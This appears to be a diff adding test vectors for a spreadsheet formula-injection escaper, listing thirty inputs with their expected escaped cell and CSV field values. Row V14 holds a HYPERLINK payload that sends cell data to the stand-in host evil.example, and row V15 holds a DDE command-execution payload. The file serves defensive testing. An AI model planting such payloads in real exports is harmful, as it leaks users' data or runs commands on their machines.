@@ -1,0 +1,31 @@
+id	input_json	expected_cell_json	expected_csv_field_json	note
+V01	"=1+2"	"'=1+2"	"'=1+2"	equals (OWASP)
+V02	"+1+2"	"'+1+2"	"'+1+2"	plus (OWASP)
+V03	"-1+2"	"'-1+2"	"'-1+2"	minus (OWASP)
+V04	"@SUM(A1:A2)"	"'@SUM(A1:A2)"	"'@SUM(A1:A2)"	at (OWASP)
+V05	"\t=1+2"	"'\t=1+2"	"'\t=1+2"	leading tab 0x09 (OWASP)
+V06	"\r=1+2"	"'\r=1+2"	"\"'\r=1+2\""	leading CR 0x0D (OWASP)
+V07	"\n=1+2"	"'\n=1+2"	"\"'\n=1+2\""	leading LF 0x0A (OWASP)
+V08	"＝1+2"	"'＝1+2"	"'＝1+2"	full-width equals (OWASP)
+V09	"＋1+2"	"'＋1+2"	"'＋1+2"	full-width plus (OWASP)
+V10	"－1+2"	"'－1+2"	"'－1+2"	full-width minus (OWASP)
+V11	"＠SUM(A1)"	"'＠SUM(A1)"	"'＠SUM(A1)"	full-width at (OWASP)
+V12	"=1+2\";=1+2"	"'=1+2\";=1+2"	"\"'=1+2\"\";=1+2\""	OWASP example 1: embedded quote and ;
+V13	"=1+2'\" ;,=1+2"	"'=1+2'\" ;,=1+2"	"\"'=1+2'\"\" ;,=1+2\""	OWASP example 2: quote, space, ; and ,
+V14	"=HYPERLINK(\"http://evil.example/?x=\"&A1,\"click\")"	"'=HYPERLINK(\"http://evil.example/?x=\"&A1,\"click\")"	"\"'=HYPERLINK(\"\"http://evil.example/?x=\"\"&A1,\"\"click\"\")\""	realistic exfil payload
+V15	"=cmd|' /C calc'!A0"	"'=cmd|' /C calc'!A0"	"'=cmd|' /C calc'!A0"	classic DDE payload
+V16	"-1"	"'-1"	"'-1"	negative number in a TEXT column is escaped (decision: text columns only; ints never negative)
+V17	"claw-01"	"claw-01"	"claw-01"	normal device name unchanged
+V18	"2026.4.8"	"2026.4.8"	"2026.4.8"	version string unchanged
+V19	""	""	"\"\""	empty stays empty
+V20	"'=1+2"	"''=1+2"	"''=1+2"	already starts with a quote: quote doubled so the rule stays reversible
+V21	" =1+2"	" =1+2"	" =1+2"	leading space: unchanged by this rule (REPORT only; Excel behaviour UNPROVEN)
+V22	"a=1"	"a=1"	"a=1"	= not first: unchanged
+V23	"name,with,commas"	"name,with,commas"	"\"name,with,commas\""	commas: RFC 4180 quoting only
+V24	"say \"hi\""	"say \"hi\""	"\"say \"\"hi\"\"\""	embedded quotes doubled only
+V25	"line1\nline2"	"line1\nline2"	"\"line1\nline2\""	embedded newline: quoted only
+V26	"café-mcp"	"café-mcp"	"café-mcp"	non-ASCII unchanged
+V27	"GHSA-xx9p-hc9w-6p5h|GHSA-p73f-w79w-jqr5"	"GHSA-xx9p-hc9w-6p5h|GHSA-p73f-w79w-jqr5"	"GHSA-xx9p-hc9w-6p5h|GHSA-p73f-w79w-jqr5"	joined list starting with G unchanged
+V28	"-GHSA-x|GHSA-y"	"'-GHSA-x|GHSA-y"	"'-GHSA-x|GHSA-y"	joined list whose first element starts with - is escaped as one cell
+V29	"@evil-mcp|good"	"'@evil-mcp|good"	"'@evil-mcp|good"	MCP name list starting with @ escaped
+V30	"="	"'="	"'="	single dangerous char escaped
